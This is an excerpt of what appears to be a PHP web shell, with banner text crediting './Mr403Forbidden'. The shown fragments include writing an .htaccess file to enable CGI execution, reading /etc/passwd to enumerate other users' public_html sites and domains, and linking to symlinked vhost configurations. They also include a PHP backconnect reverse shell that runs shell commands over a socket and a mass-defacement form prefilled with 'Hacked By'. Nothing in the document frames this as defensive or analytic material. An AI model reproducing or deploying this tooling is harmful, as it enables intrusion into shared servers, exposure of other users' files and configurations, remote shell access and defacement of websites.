...
echo '<form action="?patch='.$path.'&do=logout" method="post">';
	...
	$file_cgi = "cgi2.x140";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .x140 \n AddHandler cgi-script .x140 \n AddHandler cgi-script .x140";
...
<br><a href=\"x140_symvhost/\">Configurations</a></center>";
	...
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			...
			foreach($user_jumping[1] as $user_x140_jump) {
				$user_jumping_dir = "/home/$user_x140_jump/public_html";
					...
					if(function_exists('posix_getpwuid')) {
						...
						if($domain_jump == '') {
							...
							foreach($domains_jump[1] as $dj) {
								...
								if($user_jumping_url == $user_x140_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
...
if($_POST['backconnect'] == 'php') {
            ...
            if($errno != 0){
              ...
              fputs ($sockfd ,"
                \n{################################################################}
                \n..:: BackConnect Php By ./Mr403Forbidden ::..
                \n{################################################################}\n");
              $dir = shell_exec("pwd");
...
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By ./Mr403Forbidden</textarea><br>
